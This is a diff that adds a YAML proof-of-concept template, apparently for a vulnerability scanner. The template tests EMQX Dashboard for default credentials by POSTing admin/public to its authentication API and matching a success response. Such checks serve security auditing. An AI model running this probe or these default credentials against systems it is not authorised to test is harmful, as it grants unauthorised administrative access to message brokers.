@@ -1,0 +1,22 @@
+id: poc-yaml-emqx-dashboard-weak-pass
+info:
+  name: EMQX Dashboard 弱口令漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: EMQX
+  osprey-id: vb_2022_0071
+variables:
+  username: admin
+  password: public
+requests:
+- method: POST
+  path: /api/v4/auth
+  headers:
+    Content-Type: application/json
+  data: '{"username":"{{.username}}","password":"{{.password}}"}'
+  expression: 'status_code == 200 && contains(body, "{\"code\":0}") && !contains(body,
+    "<")
+
+    '
+transport: http
